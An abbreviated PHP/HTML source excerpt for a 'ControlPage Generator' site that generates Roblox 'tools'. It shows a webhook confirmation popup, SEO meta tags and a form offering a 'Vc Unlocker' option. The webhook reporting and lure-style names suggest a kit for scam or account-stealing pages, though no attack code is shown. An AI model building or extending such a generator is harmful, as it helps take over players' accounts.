    ...
    if ($create == "") {
        $js = 'Swal.fire({
            ...
            html: `<div class="hyperblox-swal">
                ...
                <div class="hyperblox-swal-text">Check Your Webhook</div>
            </div>`,
            background: "#0a0612",
            confirmButtonText: "OK",
            customClass: {
                popup: "hyperblox-swal-popup",
                confirmButton: "hyperblox-swal-confirm hyperblox-swal-confirm-ok"
            }
        });';
    } else {
        $js = 'Swal.fire({
...
<head>
    ...
    <meta name="author" content="ControlPage Team">
    <meta name="description" content="ControlPage Generator - Generate Roblox tools for automation, cloning, and more.">
    <meta name="keywords" content="Roblox, tool generator, control panel, game tools, automation">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="ControlPage Generator">
    <meta property="og:description" content="Generate Roblox tools for automation and customization.">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://hyperblox.eu">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="ControlPage Generator">
    <meta name="twitter:site" content="https://hyperblox.eu">
    <meta name="twitter:description" content="Generate Roblox tools for automation and customization.">
    <meta name="theme-color" content="#000000">
    <meta name="msapplication-TileColor" content="#000000">
    <meta itemprop="name" content="ControlPage Generator">
    <meta itemprop="description" content="ControlPage Generator - Roblox tools for cloning, automation, and more.">
    <title>ControlPage Generator</title>
...
<body>
    ...
    <div class="control-panel">
        <div class="panel-header">
            <h1 class="panel-title">controlPage Generator</h1>
            <p class="panel-subtitle">Generate tools with ease!</p>
        </div>
        ...
        <form method="post">
            ...
            <div class="input-group">
                ...
                <select class="panel-select" name="type" required>
                    ...
                    <option value="vu">Vc Unlocker (NEW, OP)</option>
            ...
            <div class="panel-footer">
                Already have a Website? <a href="<?php echo $do; ?>/controlPage/sign-in.php">Authorize</a>
            </div>
        </form>
    </div>
